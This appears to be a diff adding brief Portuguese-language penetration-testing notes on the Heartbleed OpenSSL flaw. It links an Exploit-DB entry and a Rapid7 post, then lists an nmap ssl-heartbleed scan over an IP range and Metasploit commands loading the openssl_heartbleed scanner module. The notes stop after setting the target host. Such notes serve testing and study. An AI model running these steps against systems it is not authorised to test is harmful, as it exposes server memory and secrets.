@@ -1,0 +1,14 @@
+*https://www.exploit-db.com/exploits/32745
+*https://www.rapid7.com/blog/post/2014/04/09/metasploits-heartbleed-scanner-module-cve-2014-0160/#:~:text=Metasploit%20publishes%20module%20for%20Heartbleed%20If%20you%20read,bugs%20that%20kicks%20everyone%20in%20security%20into%20action.
+
+1º
+
+	nmap -p 443 -script ssl-heartbleed [range de ip's]
+
+2º
+
+	msfconsole
+
+	use auxiliary/scanner/ssl/openssl_heartbleed
+
+	set RHOSTS [ip vulneravel]  
